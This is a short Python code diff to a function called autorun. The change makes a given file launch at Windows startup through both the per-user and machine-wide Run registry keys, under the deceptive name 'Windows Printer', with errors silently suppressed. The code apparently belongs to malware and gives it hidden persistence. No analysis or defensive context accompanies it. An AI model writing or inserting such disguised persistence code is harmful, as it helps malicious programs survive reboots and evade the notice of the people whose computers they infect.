@@ -43,9 +43,10 @@ def autorun(file):
     try:
         if platform.system() == 'Windows':
             import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
-                                 winreg.KEY_SET_VALUE)
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, 'Windows Printer', 0, winreg.REG_SZ, file)
+            key2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key2, 'Windows Printer', 0, winreg.REG_SZ, file)
     except:
         pass
 
